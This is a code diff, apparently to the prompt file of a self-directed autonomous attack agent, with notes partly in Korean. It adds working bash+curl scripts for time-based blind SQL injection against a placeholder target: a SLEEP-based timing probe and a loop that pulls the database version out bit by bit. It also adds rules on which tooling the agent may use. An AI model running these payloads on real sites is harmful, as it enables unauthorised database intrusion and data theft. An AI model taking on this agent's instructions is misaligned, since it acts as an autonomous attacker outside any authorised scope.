@@ -170,6 +170,29 @@ REQUIRED:
   threshold = 3 × 0.8 = 2.4s
   elapsed=2.38s < 2.4s → ❌ SLEEP 미실행: WAF 차단 중
   elapsed=2.50s >= 2.4s → ✅ SLEEP(3) 확인!
+
+## RULE SL-2 [v5.1.4]: 타이밍 측정 — bash+curl 전용 (urllib 금지)
+
+TIME-BASED BLIND SQLi에서 타이밍은 반드시 bash date 명령으로 측정한다.
+urllib.request / requests / httpx 등 Python 네트워크 라이브러리 사용 금지.
+
+✅ CORRECT — bash+curl millisecond timing:
+  TARGET="https://REAL_TARGET"
+  START=$(date +%s%N)
+  curl -sk -m 30 -G "${TARGET}/" \
+    --data-urlencode "id=1 AND SLEEP(5)--" -o /dev/null
+  END=$(date +%s%N)
+  ELAPSED=$(( (END - START) / 1000000 ))
+  echo "elapsed: ${ELAPSED}ms"
+  THRESHOLD=$(( 5000 * 80 / 100 ))
+  [ $ELAPSED -ge $THRESHOLD ] && echo "SLEEP=TRUE" || echo "SLEEP=FALSE"
+
+❌ FORBIDDEN — Python timing inside bash:
+  python3 -c "import urllib.request; ..."  ← BANNED (BASH_NO_CURL 차단)
+  python3 << 'EOF' import requests ...     ← BANNED (BASH_HEREDOC_PYTHON 차단)
+
+NOTE: `date +%s%N` = nanoseconds. Divide by 1000000 → milliseconds.
+      macOS에서 %N 미지원 시: `gdate +%s%N` (brew install coreutils) 사용.
 """
 
 # ════════════════════════════════════════════════════════════════
@@ -465,7 +488,39 @@ BINGO ENGINE v5.0 — SELF-DIRECTED AUTONOMOUS AGENT
 ║    /usr/bin/python3 << 'ANYTHING'  ← BANNED always                  ║
 ║    bash -c "python3 ..."           ← BANNED: wrapping Python         ║
 ║    import requests  inside bash    ← BANNED: use curl instead        ║
+║    import urllib.request in bash   ← BANNED: use curl instead        ║
 ║  → USE pipe ONLY:  curl ... | /usr/bin/python3 -c "..."             ║
+║                                                                      ║
+║  ✅ TIME-BASED BLIND SQLi — bash+curl timing (NO urllib needed):    ║
+║  ```bash                                                             ║
+║  TARGET="https://REAL_TARGET"                                        ║
+║  PARAM="id"                                                          ║
+║  PAYLOAD="1 AND SLEEP(5)--"                                          ║
+║  START=$(date +%s%N)                                                 ║
+║  curl -sk -m 30 -G "${TARGET}/" \                                    ║
+║    --data-urlencode "${PARAM}=${PAYLOAD}" \                          ║
+║    -H 'User-Agent: Mozilla/5.0' -o /dev/null                        ║
+║  END=$(date +%s%N)                                                   ║
+║  ELAPSED=$(( (END - START) / 1000000 ))                              ║
+║  echo "elapsed: ${ELAPSED}ms"                                        ║
+║  [ $ELAPSED -gt 4500 ] && echo "SLEEP=TRUE" || echo "SLEEP=FALSE"   ║
+║  ```                                                                 ║
+║                                                                      ║
+║  ✅ BLIND BIT EXTRACTION — one char at a time via timing:           ║
+║  ```bash                                                             ║
+║  TARGET="https://REAL_TARGET"; PARAM="id"                           ║
+║  for BIT in 1 2 3 4 5 6 7 8; do                                     ║
+║    PAYLOAD="1 AND IF(ORD(SUBSTR(@@version,1,1))>$((BIT*16)),SLEEP(3),0)--" ║
+║    START=$(date +%s%N)                                               ║
+║    curl -sk -m 20 -G "${TARGET}/" \                                  ║
+║      --data-urlencode "${PARAM}=${PAYLOAD}" -o /dev/null             ║
+║    END=$(date +%s%N)                                                 ║
+║    MS=$(( (END-START)/1000000 ))                                     ║
+║    [ $MS -gt 2500 ] && echo "BIT${BIT}=1(${MS}ms)" || echo "BIT${BIT}=0(${MS}ms)" ║
+║  done                                                                ║
+║  ```                                                                 ║
+║  → date +%s%N = nanoseconds → divide by 1000000 = milliseconds.    ║
+║  → NEVER use urllib.request / requests for timing. Use date+curl.  ║
 ║                                                                      ║
 ║  ❌ NEVER invent credentials/passwords/hashes without execution:    ║
 ║    username: admin  password: P@ssw0rd  ← FABRICATION = BANNED      ║
